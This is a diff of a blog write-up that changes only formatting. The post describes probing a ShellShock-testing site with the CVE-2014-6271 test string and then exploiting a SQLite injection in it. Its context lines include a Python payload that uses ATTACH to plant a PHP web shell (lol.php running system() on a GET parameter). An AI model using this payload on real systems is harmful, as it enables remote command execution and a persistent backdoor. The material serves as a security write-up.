@@ -3,7 +3,7 @@
 ====================
 
 :date: 2014-12-16 15:35
-:tags: secprog, sqlite, sqli, shellshock
+:tags: secprog, sqlite, sqli, shellshock, writeup
 :category: memo
 :slug: shellshock-writeup
 :authors: Zespre Schmidt
@@ -43,7 +43,7 @@ And it turns out to be the following result:
     Accept: */*
 
 
-Ah-ha! The string `{ :;}; echo 'ShellShockTester_atdog';` is a typical method to
+Ah-ha! The string ``{ :;}; echo 'ShellShockTester_atdog';`` is a typical method to
 test if the bash which is currently using is vulnerable to CVE-2014-6271. A
 system which is vulnerable will echo the string "ShellShockTester_atdog".
 Similarly, the target website which runs CGI program will return the string if
@@ -53,7 +53,7 @@ ShellShock Tester?
 Building a simple HTTP server using python module `Flask`_. It returns the
 string when the ShellShock Tester queried for the index page. It seems that the 
 ShellShock Tester stores the response returned from the target website into its 
-database using `insert`. At the time the type of the database is still unknown.
+database using ``insert``. At the time the type of the database is still unknown.
 
 So I append a single quote right after the string, and the result showed on the
 ShellShock Tester is:
@@ -114,9 +114,9 @@ directory of the website.
     inj = 'ATTACH \'./lol.php\' AS lol; CREATE TABLE lol.pwn (dataz TEXT); INSERT INTO lol.pwn (dataz) VALUES (\'<pre><?php system($_GET["cmd"]); ?></pre>\');'
     resp = trick.format(inj)
 
-This will build a backdoor called `lol.php`. So anyone can visit that page along
-with a "GET" argument `cmd`. The value of `cmd` could be any shell command. The
-reason is that `ATTACH` command will attach a SQLite database. If the database
+This will build a backdoor called ``lol.php``. So anyone can visit that page along
+with a "GET" argument ``cmd``. The value of ``cmd`` could be any shell command. The
+reason is that ``ATTACH`` command will attach a SQLite database. If the database
 does not exist, it create the database which is a PHP file. The file's content
 contains a short piece of PHP code showed above.
 
